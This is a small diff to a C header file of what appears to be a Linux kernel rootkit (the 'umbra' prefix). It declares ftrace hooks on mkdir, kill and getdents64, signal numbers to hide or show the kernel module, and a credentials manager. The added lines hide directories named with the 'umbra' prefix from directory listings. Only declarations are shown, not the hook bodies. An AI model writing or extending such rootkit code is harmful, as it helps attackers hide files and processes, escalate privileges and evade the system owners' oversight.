@@ -8,6 +8,7 @@
 #include <linux/linkage.h>
 #include <linux/list.h>
 #include <linux/export.h>
+#include <linux/dirent.h>
 
 #include "ftrace_manager.h"
 #include "creds_manager.h"
@@ -18,12 +19,18 @@
 #define SIGNAL_HIDE_KERNEL_MODULE 52
 #define SIGNAL_SHOW_KERNEL_MODULE 53
 
+#define UMBRA_DIRECTORY_PREFIX "umbra"
+
 //Hooking mkdir
 asmlinkage int hook_mkdir(const struct pt_regs *regs);
 
 
 //Hooking kill
 asmlinkage int hook_kill(const struct pt_regs *regs);
+
+
+//Hooking getdents for ls
+asmlinkage int hook_getdents64(const struct pt_regs *regs);
 
 
 void remove_all_hooks(void);
